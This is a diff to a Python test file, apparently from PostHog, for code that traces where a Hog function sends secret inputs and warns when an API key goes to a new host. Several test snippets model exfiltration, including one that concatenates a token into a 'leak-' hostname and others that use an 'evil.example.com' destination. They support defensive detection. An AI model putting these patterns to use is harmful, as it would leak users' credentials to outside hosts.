@@ -13,10 +13,13 @@ from parameterized import parameterized
 
 from products.cdp.backend.secret_origins import (
     UNBOUND,
+    SecretDestinations,
     SecretOrigins,
     SecretOriginsAnalysis,
     UnanalyzableReason,
+    Unbound,
     analyze_secret_origins,
+    public_secret_destinations,
     secret_origins,
     secret_reentry_message,
     url_origin,
@@ -60,6 +63,14 @@ def _inputs(**values: Any) -> dict[str, dict[str, Any]]:
 
 def _origins(*origins: str) -> frozenset[str]:
     return frozenset(origins)
+
+
+def _to(*origins: str) -> SecretDestinations:
+    return SecretDestinations(hosts=frozenset(origins), built_from=frozenset())
+
+
+def _built_from(*keys: str) -> SecretDestinations:
+    return SecretDestinations(hosts=frozenset(), built_from=frozenset(keys))
 
 
 # Nesting deep enough to pass the default recursion limit can also pass a parser's own nesting limit,
@@ -692,61 +703,131 @@ class TestSecretHosts(SimpleTestCase):
     @parameterized.expand(
         [
             (
+                "names_a_host_written_in_the_config",
+                SENDS_TOKEN_TO_URL,
+                _inputs(url="https://hooks.example.com/a", token="sklive"),
+                {"token": _to("https://hooks.example.com")},
+            ),
+            (
+                "names_a_written_host_that_matches_the_secret",
+                "fetch('https://sklive.example.com', {'body': inputs.token})",
+                _inputs(token="sklive"),
+                {"token": _to("https://sklive.example.com")},
+            ),
+            (
+                "names_the_host_of_an_address_with_the_secret_in_its_path",
+                "fetch(concat('https://api.example.com/bot', inputs.token, '/send'))",
+                _inputs(token="sklive"),
+                {"token": _to("https://api.example.com")},
+            ),
+            (
+                "secret_concatenated_into_the_host",
+                "fetch(concat('https://leak-', inputs.token, '.example.com'))",
+                _inputs(token="sklive"),
+                {"token": _built_from("token")},
+            ),
+            (
+                "secret_in_the_host_through_a_variable",
+                "let host := concat(inputs.token, '.example.com')\nfetch(concat('https://', host))",
+                _inputs(token="sklive"),
+                {"token": _built_from("token")},
+            ),
+            (
+                "input_template_puts_the_secret_in_the_host",
+                SENDS_TOKEN_TO_URL,
+                _inputs(url="https://{inputs.token}.example.com", token="sklive"),
+                {"token": _built_from("token")},
+            ),
+            (
+                "secret_is_the_whole_address",
+                "fetch(inputs.target, {'body': inputs.token})",
+                _inputs(target="https://private.example.com/a", token="sklive"),
+                {"token": _built_from("target"), "target": _built_from("target")},
+            ),
+            (
+                "transformed_secret_in_the_host",
+                "fetch(concat('https://', lower(inputs.token), '.example.com'))",
+                _inputs(token="sklive"),
+                {"token": UNBOUND},
+            ),
+            (
+                "address_from_event_data",
+                "fetch(concat(event.properties.url, inputs.token))",
+                _inputs(token="sklive"),
+                {"token": UNBOUND},
+            ),
+        ]
+    )
+    def test_public_secret_destinations(
+        self, _name: str, hog: str, inputs: dict, expected: dict[str, SecretDestinations | Unbound]
+    ) -> None:
+        assert public_secret_destinations(hog, inputs, [], set(expected)) == expected
+
+    @parameterized.expand(
+        [
+            (
                 "names_only_the_new_host",
-                _origins("https://evil.example.com", "https://hooks.example.com"),
-                _origins("https://hooks.example.com"),
-                {},
+                _to("https://evil.example.com", "https://hooks.example.com"),
+                _to("https://hooks.example.com"),
                 "This change sends API key to evil.example.com. Until now it was only sent to hooks.example.com.",
             ),
             (
                 "keeps_a_port_and_plain_http",
-                _origins("http://hooks.example.com:8080"),
-                _origins("https://hooks.example.com:8443"),
-                {},
+                _to("http://hooks.example.com:8080"),
+                _to("https://hooks.example.com:8443"),
                 "This change sends API key to http://hooks.example.com:8080. "
                 "Until now it was only sent to hooks.example.com:8443.",
             ),
             (
                 "caps_a_long_list_after_it_went_nowhere",
-                _origins(*(f"https://{name}.example.com" for name in "abcde")),
-                _origins(),
-                {},
+                _to(*(f"https://{name}.example.com" for name in "abcde")),
+                _to(),
                 "This change sends API key to a.example.com, b.example.com, c.example.com and 2 more. "
                 "Until now it wasn't sent anywhere.",
             ),
             (
                 "unbound_now",
                 UNBOUND,
-                _origins("https://a.example.com", "https://b.example.com"),
-                {},
+                _to("https://a.example.com", "https://b.example.com"),
                 "PostHog can't tell where this change sends API key. "
                 "Until now it was only sent to a.example.com and b.example.com.",
             ),
             (
                 "unbound_before",
-                _origins("https://hooks.example.com"),
+                _to("https://hooks.example.com"),
                 UNBOUND,
-                {},
                 "This change sends API key to hooks.example.com. Until now PostHog couldn't tell where it was sent.",
             ),
             (
-                "host_kept_in_a_secret_input",
-                _origins("https://private.example.com"),
-                _origins("https://hooks.example.com"),
-                {"Webhook URL": ["https://Private.Example.com/T0/b1"]},
-                "This change sends API key to the address in Webhook URL. "
+                "address_built_from_a_secret",
+                _built_from("target"),
+                _to("https://hooks.example.com"),
+                "This change sends API key to an address built from Webhook URL. "
                 "Until now it was only sent to hooks.example.com.",
+            ),
+            (
+                "stored_address_built_from_a_secret",
+                _to("https://evil.example.com"),
+                _built_from("api_key"),
+                "This change sends API key to evil.example.com. "
+                "Until now it was only sent to an address built from API key.",
+            ),
+            (
+                "same_built_address_on_both_sides",
+                _built_from("target"),
+                _built_from("target"),
+                "This change sends API key to an address built from Webhook URL. "
+                "Until now it was only sent to an address built from Webhook URL.",
             ),
         ]
     )
     def test_secret_reentry_message(
         self,
         _name: str,
-        sends_to: SecretOrigins,
-        sent_to: SecretOrigins,
-        secret_values: dict[str, list[str]],
+        now: SecretDestinations | Unbound,
+        before: SecretDestinations | Unbound,
         expected: str,
     ) -> None:
-        message = secret_reentry_message("API key", sends_to, sent_to, secret_values)
+        message = secret_reentry_message("api_key", now, before, {"api_key": "API key", "target": "Webhook URL"})
 
         assert message == f"{expected} Enter it again to confirm."
